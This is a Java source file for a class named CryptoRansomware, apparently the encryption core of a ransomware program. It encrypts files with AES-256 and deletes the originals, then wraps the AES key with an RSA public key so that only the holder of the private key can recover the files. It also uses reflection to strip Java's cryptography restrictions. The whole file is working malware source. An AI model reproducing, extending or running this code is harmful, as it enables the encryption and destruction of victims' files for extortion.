package com.security;


import org.apache.commons.codec.binary.Base64;

import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.security.*;
import java.sql.SQLException;
import java.util.Map;

public class CryptoRansomware {

    private final static String encoding = "UTF-8";
    private final static String AESAlgorithm = "AES";
    private final static String RSAAlgorithm = "RSA";
    private final static int AES_Key_Size = 256;
    private final static String Instance = "AES/CFB8/NoPadding";
    private static byte[] ivBytes = new byte[]{0x15, 0x14, 0x13, 0x12, 0x11, 0x10, 0x09, 0x08, 0x07, 0x06, 0x05, 0x04, 0x03, 0x02, 0x01, 0x00};

    static {
        removeCryptographyRestrictions();
    }

    public static void EncryptFile(final File in, final File out, final SecretKeySpec aeskeySpec) {
        try {
            final Cipher aesCipher = Cipher.getInstance(Instance);
            aesCipher.init(Cipher.ENCRYPT_MODE, aeskeySpec, new IvParameterSpec(ivBytes));

            FileInputStream is = new FileInputStream(in);
            CipherOutputStream os = new CipherOutputStream(new FileOutputStream(out), aesCipher);

            copy(is, os);

            is.close();
            os.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (InvalidAlgorithmParameterException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        }

        boolean bool = in.delete();
        System.out.println("File deleted: " + bool);
    }

    public static String Encrypt(PublicKey pubKey, SecretKeySpec aeskeySpec) {
        String encryptedString = "";
        try {

            final String encodedKey = Base64.encodeBase64String(aeskeySpec.getEncoded());
            final byte[] plainBytes = encodedKey.getBytes("UTF-8");
            final Cipher cipher = Cipher.getInstance(RSAAlgorithm);
            cipher.init(Cipher.ENCRYPT_MODE, pubKey);
            final byte[] encrypted = cipher.doFinal(plainBytes);
            encryptedString = new String(Base64.encodeBase64(encrypted));

            return encryptedString;

        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return encryptedString;
    }

    public static SecretKeySpec Decrypt(PrivateKey privateKey, String cipherText) {
        SecretKeySpec aeskeyspec = null;
        try {
            final byte[] plainBytes = Base64.decodeBase64(cipherText.getBytes("UTF-8"));
            final Cipher cipher = Cipher.getInstance(RSAAlgorithm);
            cipher.init(Cipher.DECRYPT_MODE, privateKey);
            final byte[] decrypteed = cipher.doFinal(plainBytes);
            final String DecryptedString = new String(decrypteed, "UTF-8");

            byte[] decodedKey = Base64.decodeBase64(DecryptedString);
            aeskeyspec = new SecretKeySpec(decodedKey, 0, decodedKey.length, "AES");
            return aeskeyspec;
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        }
        return aeskeyspec;
    }


    public static void DecryptFile(final File in, final File out, final SecretKeySpec aeskeySpec) {
        try {
            final Cipher aesCipher = Cipher.getInstance(Instance);
            aesCipher.init(Cipher.DECRYPT_MODE, aeskeySpec, new IvParameterSpec(ivBytes));

            CipherInputStream is = new CipherInputStream(new FileInputStream(in), aesCipher);
            FileOutputStream os = new FileOutputStream(out);

            copy(is, os);

            is.close();
            os.close();

        } catch (IOException ex) {
            ex.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (InvalidAlgorithmParameterException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        }

        boolean bool = in.delete();
        System.out.println("File deleted: " + bool);
    }


    private static void copy(InputStream is, OutputStream os) throws IOException {
        int i;
        final byte[] b = new byte[8192];
        while ((i = is.read(b)) != -1) {
            os.write(b, 0, i);
            os.flush();
        }
        os.close();
        is.close();
    }

    public static SecretKeySpec GenKey() throws NoSuchAlgorithmException, RansomwareException, SQLException {

        if (EmbeddedDatabase.CreateTable())
            throw new RansomwareException("Already Encrypted And Stored To Embedded Database");


        final KeyGenerator kgen = KeyGenerator.getInstance(AESAlgorithm);
        kgen.init(AES_Key_Size);
        SecretKey key = kgen.generateKey();

        final byte[] aesKey = key.getEncoded();
        SecretKeySpec aeskeySpec = new SecretKeySpec(aesKey, AESAlgorithm);

        return aeskeySpec;
    }


    public static SecretKeySpec RetrieveAesKey(String privKey) throws SQLException, GeneralSecurityException {
        final String EncryptedAesKey = EmbeddedDatabase.SelectKeyFromTable();
        return Decrypt(RsaKeyReader.loadPrivateKey(privKey), EncryptedAesKey);
    }

    public static String RetrieveEncryptedAesKey(String pubkey, SecretKeySpec AesKeyspec) throws SQLException, GeneralSecurityException {
        return Encrypt(RsaKeyReader.loadPublicKey(pubkey), AesKeyspec);
    }

    private static void removeCryptographyRestrictions() {
        if (!isRestrictedCryptography()) {
            System.out.println("Cryptography restrictions removal not needed");
            return;
        }
        try {

            final Class<?> jceSecurity = Class.forName("javax.crypto.JceSecurity");
            final Class<?> cryptoPermissions = Class.forName("javax.crypto.CryptoPermissions");
            final Class<?> cryptoAllPermission = Class.forName("javax.crypto.CryptoAllPermission");

            final Field isRestrictedField = jceSecurity.getDeclaredField("isRestricted");
            isRestrictedField.setAccessible(true);
            final Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(isRestrictedField, isRestrictedField.getModifiers() & ~Modifier.FINAL);
            isRestrictedField.set(null, false);

            final Field defaultPolicyField = jceSecurity.getDeclaredField("defaultPolicy");
            defaultPolicyField.setAccessible(true);
            final PermissionCollection defaultPolicy = (PermissionCollection) defaultPolicyField.get(null);

            final Field perms = cryptoPermissions.getDeclaredField("perms");
            perms.setAccessible(true);
            ((Map<?, ?>) perms.get(defaultPolicy)).clear();

            final Field instance = cryptoAllPermission.getDeclaredField("INSTANCE");
            instance.setAccessible(true);
            defaultPolicy.add((Permission) instance.get(null));

            System.out.println("Successfully removed cryptography restrictions");
        } catch (final Exception e) {
            System.out.println("Failed to remove cryptography restrictions" + e);
        }
    }

    private static boolean isRestrictedCryptography() {
        return "Java(TM) SE Runtime Environment".equals(System.getProperty("java.runtime.name"));
    }
}
